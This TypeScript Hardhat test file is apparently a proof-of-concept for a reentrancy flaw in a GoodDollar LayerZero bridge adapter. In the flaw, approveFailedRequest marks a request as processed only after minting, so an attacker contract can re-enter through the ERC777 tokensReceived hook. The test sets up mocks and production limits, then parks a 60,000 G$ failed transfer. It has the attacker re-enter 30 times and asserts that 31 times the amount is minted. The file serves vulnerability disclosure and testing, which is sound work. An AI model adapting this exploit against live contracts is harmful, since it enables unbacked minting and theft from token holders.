import { ethers, upgrades } from 'hardhat';
import { expect } from 'chai';
import { time } from '@nomicfoundation/hardhat-network-helpers';

// PoC: GoodDollarOFTAdapter.approveFailedRequest updates `failed` only after _credit(), and G$ (SuperGoodDollar)
// calls the recipient's ERC777 tokensReceived hook on mint, so the recipient can re-enter and mint repeatedly.
const DECIMAL_CONVERSION_RATE = ethers.BigNumber.from(10).pow(12);

function encodeOFTMessage(toAddress: string, amountLD: ethers.BigNumber): string {
  const toBytes32 = ethers.utils.hexZeroPad(toAddress, 32);
  const amountHex = ethers.utils.hexZeroPad(amountLD.div(DECIMAL_CONVERSION_RATE).toHexString(), 8);
  return toBytes32 + amountHex.slice(2);
}

describe('PoC: approveFailedRequest reentrancy', () => {
  it('mints a single failed request multiple times via tokensReceived re-entry', async () => {
    const [owner, feeRecipient, avatar] = await ethers.getSigners();

    const nameService = await (await ethers.getContractFactory('NameServiceMock')).deploy();
    const controller = await (await ethers.getContractFactory('ControllerMock')).deploy(avatar.address);
    const token = await (await ethers.getContractFactory('MockGoodDollarWithMintHook')).deploy();
    await nameService.setAddress('CONTROLLER', controller.address);
    await nameService.setAddress('GOODDOLLAR', token.address);

    const endpoint = await (await ethers.getContractFactory('LayerZeroEndpointMock')).deploy();
    const minterBurner = await (await ethers.getContractFactory('GoodDollarOFTMinterBurner')).deploy();
    const harness = await upgrades.deployProxy(
      await ethers.getContractFactory('GoodDollarOFTAdapterHarness'),
      [token.address, minterBurner.address, owner.address, feeRecipient.address],
      {
        kind: 'uups',
        constructorArgs: [token.address, endpoint.address],
        unsafeAllow: ['constructor', 'state-variable-immutable', 'duplicate-initializer-call', 'missing-initializer'],
      },
    );
    await minterBurner.initialize(nameService.address, harness.address);

    // production limits from scripts/oft/oft.config.json
    await harness.setBridgeLimits({
      dailyLimit: ethers.utils.parseEther('1000000'),
      txLimit: ethers.utils.parseEther('100000'),
      accountDailyLimit: ethers.utils.parseEther('50000'),
      minAmount: ethers.utils.parseEther('10'),
      onlyWhitelisted: false,
    });

    const attacker = await (await ethers.getContractFactory('FailedRequestReentrancyAttacker')).deploy(harness.address);

    // Inbound transfer above the destination accountDailyLimit is parked as a failed request
    const amountLD = ethers.utils.parseEther('60000');
    const guid = ethers.utils.formatBytes32String('poc-guid');
    const origin = { srcEid: 1, sender: ethers.constants.HashZero, nonce: 1 };
    await harness.exposed_lzReceive(
      origin,
      guid,
      encodeOFTMessage(attacker.address, amountLD),
      ethers.constants.AddressZero,
      '0x',
    );
    expect((await harness.failedReceiveRequests(guid)).failed).to.equal(true);

    await time.increase(3 * 24 * 60 * 60 + 1);

    const reentries = 30;
    await attacker.attack(guid, reentries);

    const received = await token.balanceOf(attacker.address);
    console.log(
      `      bridged: ${ethers.utils.formatEther(amountLD)} G$, minted to attacker: ${ethers.utils.formatEther(
        received,
      )} G$`,
    );
    expect(received).to.equal(amountLD.mul(reentries + 1));
  });
});
